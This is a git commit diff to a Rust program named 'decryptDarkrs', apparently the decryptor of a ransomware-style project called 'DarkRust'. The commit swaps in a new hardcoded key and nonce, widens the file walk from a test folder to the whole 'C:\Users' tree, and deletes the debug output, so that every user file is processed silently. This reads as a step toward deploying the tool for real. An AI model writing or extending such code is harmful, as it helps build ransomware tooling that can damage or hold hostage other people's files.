c06b57a63bc67391821fac16700ff334182397c6
hoagie195 <hoagie195@gmail.com>
2023-05-02 14:08:41 -0500

    Self-deleting and cleanup

--- decryptDarkrs/src/main.rs
+++ decryptDarkrs/src/main.rs
@@ -9,22 +9,16 @@ use std::fs;
 use anyhow::anyhow;
 
 fn main() {
-    let mut key = [139, 126, 86, 117, 220, 68, 15, 204, 19, 236, 104, 88, 159, 36, 208, 96, 147, 42, 151, 142, 119, 190, 46, 62, 5, 96, 179, 175, 124, 238, 139, 184];
-    let mut nonce = [217, 190, 79, 64, 1, 171, 39, 85, 8, 221, 229, 225, 84, 144, 247, 133, 247, 188, 255, 36, 174, 157, 189, 203];
+    let key = [126, 174, 231, 244, 185, 39, 152, 10, 223, 167, 148, 254, 28, 186, 115, 195, 87, 111, 193, 20, 98, 249, 212, 123, 151, 4, 230, 65, 68, 83, 45, 49];
+    let nonce = [99, 17, 194, 93, 155, 32, 56, 126, 242, 173, 112, 241, 183, 96, 191, 111, 77, 40, 67, 80, 197, 145, 32, 143];
     let mut all_files: Vec<DirEntry> = Vec::new();
-    for entry in WalkDir::new("C:\\Users\\logan\\Documents\\testDarkRust\\Test3").into_iter().filter_map(|e| e.ok()) {
+    for entry in WalkDir::new("C:\\Users").into_iter().filter_map(|e| e.ok()) {
         if entry.file_type().is_file() {
             all_files.push(entry)
         }
-        else {
-            println!("Full Path: {}", entry.path().display());
-            println!("This is a directory");
-        }
     }
     
-    println!("\nHere are all the files: ");
     for entry in all_files{
-        println!("{}", entry.path().display());
         if let Some(filepath) = entry.path().as_os_str().to_str() {
             decrypt_sm_file(filepath, &key, &nonce);
         }
